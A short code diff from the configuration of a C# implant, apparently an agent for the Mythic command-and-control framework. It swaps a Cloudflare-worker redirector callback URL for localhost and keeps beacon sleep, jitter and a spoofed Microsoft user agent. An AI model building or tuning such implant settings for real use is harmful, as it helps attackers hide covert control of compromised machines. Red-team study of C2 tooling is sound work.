@@ -6,7 +6,7 @@ namespace Chimera
     {
         // POST goes through Cloudflare worker → Mythic on VPS port 80
         // post_uri in Mythic HTTP profile = "data"  →  full path = /data
-        public static string CallbackURL     = "https://hidden-lake-0908.walrus012.workers.dev/data";
+        public static string CallbackURL     = "http://127.0.0.1:8080/data";
         public static int    SleepInterval   = 10;   // seconds
         public static int    Jitter          = 30;   // % of SleepInterval
         public static string UserAgent       = "Microsoft-CryptoAPI/10.0";
